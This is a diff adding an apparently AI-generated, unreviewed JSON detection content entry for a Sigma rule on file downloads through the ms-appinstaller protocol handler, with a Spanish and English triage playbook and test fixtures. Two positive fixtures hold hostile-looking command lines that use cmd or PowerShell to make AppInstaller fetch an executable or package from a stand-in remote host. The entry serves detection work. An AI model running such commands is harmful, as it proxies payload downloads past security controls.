@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "180c7c5c-d64b-4a63-86e9-68910451bc8b",
+    "title": "Potential File Download Via MS-AppInstaller Protocol Handler",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel",
+    "path": "windows/process_creation/proc_creation_win_susp_ms_appinstaller_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_susp_ms_appinstaller_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso se ejecutó con una línea de comandos que invoca el protocolo ms-appinstaller con un parámetro source apuntando a una URL HTTP/HTTPS. Esto puede provocar que AppInstaller.exe descargue un archivo arbitrario desde una fuente remota.",
+      "what_it_detects": "Eventos de creación de procesos en Windows cuyo CommandLine contiene a la vez 'ms-appinstaller://?source=' y 'http'. Es decir, el protocol handler de App Installer recibe una URL remota por línea de comandos.",
+      "why_it_matters": "AppInstaller.exe es un binario firmado por Microsoft que figura en LOLBAS. Un atacante puede usarlo como proxy para descargar payloads y evadir controles (T1218, System Binary Proxy Execution). Los archivos quedan en ...\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<directorio aleatorio>.",
+      "triage_steps": [
+        "Revise CommandLine completo y extraiga la URL del parámetro source: dominio, IP, protocolo y extensión del archivo (.appinstaller, .msix, .exe u otros).",
+        "Identifique Image y ParentImage: si el padre es cmd.exe, powershell.exe, wscript.exe, mshta.exe o un proceso de Office, aumenta la sospecha.",
+        "Confirme el usuario y el host. Valide si el usuario suele instalar paquetes MSIX y si el dominio pertenece a un proveedor aprobado.",
+        "Busque en el mismo host, +/- 15 minutos, la ejecución de AppInstaller.exe y la creación de archivos en la ruta INetCache de Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.",
+        "Obtenga el hash de los archivos descargados y consúltelo en su plataforma de threat intelligence. Revise también la firma del paquete.",
+        "Pivote por el dominio o la IP de la URL en los logs de proxy, DNS y firewall para hallar otros hosts que accedieron a la misma fuente.",
+        "Revise procesos hijo posteriores y conexiones de red salientes del host, y alertas previas del mismo usuario o equipo."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; trate cada alerta como sospechosa hasta validarla.",
+        "Despliegues legítimos de paquetes MSIX/App Installer mediante scripts internos que usan ms-appinstaller con una URL corporativa aprobada.",
+        "Pruebas de desarrolladores o del equipo de empaquetado que publican paquetes .appinstaller en servidores web internos."
+      ],
+      "response_steps": [
+        "Verifique con el usuario y con el equipo de TI si la descarga o la instalación estaban autorizadas.",
+        "Si no lo estaban, aísle el endpoint y bloquee el dominio o la IP de la URL en el proxy y el firewall.",
+        "Recolecte los archivos de INetCache y los paquetes instalados para su análisis antes de eliminarlos. Desinstale paquetes maliciosos ya confirmados.",
+        "Busque la misma URL o el mismo hash en toda la flota y evalúe restringir el protocolo ms-appinstaller mediante directivas de grupo."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque es una técnica LOLBAS conocida para descargar archivos, aunque requiere validar el contexto antes de confirmar actividad maliciosa."
+    },
+    "en": {
+      "summary": "A process was started with a command line that invokes the ms-appinstaller protocol with a source parameter pointing to an HTTP/HTTPS URL. This can make AppInstaller.exe download an arbitrary file from a remote location.",
+      "what_it_detects": "Windows process creation events whose CommandLine contains both 'ms-appinstaller://?source=' and 'http', meaning the App Installer protocol handler receives a remote URL on the command line.",
+      "why_it_matters": "AppInstaller.exe is a Microsoft-signed binary listed in LOLBAS. Attackers can use it as a proxy to download payloads and bypass controls (T1218, System Binary Proxy Execution). Files land in ...\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<random directory>.",
+      "triage_steps": [
+        "Read the full CommandLine and extract the source URL: domain, IP, scheme and file extension (.appinstaller, .msix, .exe or other).",
+        "Check Image and ParentImage; a parent such as cmd.exe, powershell.exe, wscript.exe, mshta.exe or an Office process raises suspicion.",
+        "Confirm user and host. Check whether this user normally installs MSIX packages and whether the domain belongs to an approved vendor.",
+        "On the same host within +/- 15 minutes, look for AppInstaller.exe execution and file creation under the Microsoft.DesktopAppInstaller_8wekyb3d8bbwe INetCache path.",
+        "Hash any downloaded files and check them in threat intelligence. Also check the package signature.",
+        "Pivot on the URL's domain or IP in proxy, DNS and firewall logs to find other hosts that contacted it.",
+        "Review subsequent child processes, outbound connections and earlier alerts for the same user or host."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives; treat alerts as suspicious until validated.",
+        "Legitimate MSIX/App Installer deployments by internal scripts using ms-appinstaller with an approved corporate URL.",
+        "Developer or packaging team tests publishing .appinstaller files on internal web servers."
+      ],
+      "response_steps": [
+        "Confirm with the user and IT whether the download or installation was authorized.",
+        "If not, isolate the endpoint and block the URL's domain or IP at the proxy and firewall.",
+        "Collect INetCache files and installed packages for analysis before removal. Uninstall packages confirmed as malicious.",
+        "Hunt for the same URL or hash fleet-wide and consider restricting the ms-appinstaller protocol via Group Policy."
+      ],
+      "severity_rationale": "Medium fits because this is a known LOLBAS download technique, but context must be validated before confirming malicious activity."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "cmd.exe launched from a script uses start with ms-appinstaller to fetch a remote file over HTTPS",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "cmd.exe /c start ms-appinstaller://?source=https://files.example.com/update/tool.exe",
+          "CurrentDirectory": "C:\\Users\\jperez\\Downloads\\"
+        }
+      },
+      {
+        "description": "PowerShell invokes the protocol handler with a plain HTTP URL to an IP address",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0217.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -nop -c Start-Process 'ms-appinstaller://?source=http://203.0.113.25/pkg/app.msix'",
+          "CurrentDirectory": "C:\\Users\\mrojas\\Documents\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "ms-appinstaller used with a local .appinstaller file, no http in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\explorer.exe",
+          "ParentImage": "C:\\Windows\\System32\\userinit.exe",
+          "CommandLine": "C:\\Windows\\explorer.exe ms-appinstaller://?source=C:\\Packages\\Contoso.App.appinstaller",
+          "CurrentDirectory": "C:\\Windows\\System32\\"
+        }
+      },
+      {
+        "description": "AppInstaller.exe started normally without the protocol source parameter",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0305.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.21.3133.0_x64__8wekyb3d8bbwe\\AppInstaller.exe",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "\"C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.21.3133.0_x64__8wekyb3d8bbwe\\AppInstaller.exe\" -ServerName:App.AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h.mca",
+          "CurrentDirectory": "C:\\Windows\\System32\\"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
